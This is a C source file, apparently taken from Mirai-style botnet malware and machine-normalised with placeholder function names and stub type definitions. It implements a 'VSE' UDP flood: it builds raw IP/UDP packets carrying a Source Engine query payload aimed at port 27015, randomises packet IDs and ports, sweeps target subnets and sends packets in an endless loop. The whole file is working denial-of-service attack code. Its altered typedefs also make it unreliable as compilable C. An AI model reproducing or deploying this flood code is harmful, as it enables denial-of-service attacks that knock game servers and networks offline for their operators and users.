#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  int uint8_t ;
typedef  int uint32_t ;
typedef  int uint16_t ;
struct udphdr {void* dest; void* len; scalar_t__ check; void* source; } ;
struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
struct iphdr {int version; int ihl; int tos; int id; int ttl; scalar_t__ check; int /*<<< orphan*/  daddr; int /*<<< orphan*/  saddr; int /*<<< orphan*/  protocol; void* frag_off; void* tot_len; } ;
struct TYPE_2__ {void* sin_port; } ;
struct attack_target {int netmask; TYPE_1__ sock_addr; int /*<<< orphan*/  addr; } ;
struct attack_option {int dummy; } ;
typedef  int port_t ;
typedef  void* BOOL ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  ATK_OPT_DPORT ; 
 int /*<<< orphan*/  ATK_OPT_IP_DF ; 
 int /*<<< orphan*/  ATK_OPT_IP_IDENT ; 
 int /*<<< orphan*/  ATK_OPT_IP_TOS ; 
 int /*<<< orphan*/  ATK_OPT_IP_TTL ; 
 int /*<<< orphan*/  ATK_OPT_SPORT ; 
 int FALSE ; 
 int /*<<< orphan*/  IPPROTO_IP ; 
 int /*<<< orphan*/  IPPROTO_UDP ; 
 int /*<<< orphan*/  IP_HDRINCL ; 
 int /*<<< orphan*/  LOCAL_ADDR ; 
 int /*<<< orphan*/  MSG_NOSIGNAL ; 
 int /*<<< orphan*/  SOCK_RAW ; 
 int /*<<< orphan*/  TABLE_ATK_VSE ; 
 scalar_t__ TRUE ; 
 void* FUNC0 (int,struct attack_option*,int /*<<< orphan*/ ,int) ; 
 void* FUNC1 (int,int) ; 
 scalar_t__ FUNC2 (int*,int) ; 
 scalar_t__ FUNC3 (struct iphdr*,struct udphdr*,void*,int) ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 scalar_t__ errno ; 
 int /*<<< orphan*/  FUNC5 (scalar_t__) ; 
 void* FUNC6 (int) ; 
 scalar_t__ FUNC7 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC8 (char*,...) ; 
 void* FUNC9 () ; 
 int /*<<< orphan*/  FUNC10 (int,char*,int,int /*<<< orphan*/ ,struct sockaddr*,int) ; 
 int FUNC11 (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int*,int) ; 
 int FUNC12 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 char* FUNC13 (int /*<<< orphan*/ ,int*) ; 
 int /*<<< orphan*/  FUNC14 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC15 (char*,char*,int) ; 

void FUNC16(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = FUNC1(targs_len, sizeof (char *));
    uint8_t ip_tos = FUNC0(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = FUNC0(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = FUNC0(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = FUNC0(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = FUNC0(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = FUNC0(opts_len, opts, ATK_OPT_DPORT, 27015);
    char *vse_payload;
    int vse_payload_len;

    FUNC14(TABLE_ATK_VSE);
    vse_payload = FUNC13(TABLE_ATK_VSE, &vse_payload_len);

    if ((fd = FUNC12(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    if (FUNC11(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        FUNC4(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        pkts[i] = FUNC1(128, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        udph = (struct udphdr *)(iph + 1);
        data = (char *)(udph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = FUNC6(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);
        iph->id = FUNC6(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = FUNC6(1 << 14);
        iph->protocol = IPPROTO_UDP;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = targs[i].addr;

        udph->source = FUNC6(sport);
        udph->dest = FUNC6(dport);
        udph->len = FUNC6(sizeof (struct udphdr) + 4 + vse_payload_len);

        *((uint32_t *)data) = 0xffffffff;
        data += sizeof (uint32_t);
        FUNC15(data, vse_payload, vse_payload_len);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            
            // For prefix attacks
            if (targs[i].netmask < 32)
                iph->daddr = FUNC5(FUNC7(targs[i].addr) + (((uint32_t)FUNC9()) >> targs[i].netmask));

            if (ip_ident == 0xffff)
                iph->id = (uint16_t)FUNC9();
            if (sport == 0xffff)
                udph->source = FUNC9();
            if (dport == 0xffff)
                udph->dest = FUNC9();

            iph->check = 0;
            iph->check = FUNC2((uint16_t *)iph, sizeof (struct iphdr));

            udph->check = 0;
            udph->check = FUNC3(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len);

            targs[i].sock_addr.sin_port = udph->dest;
            FUNC10(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + vse_payload_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}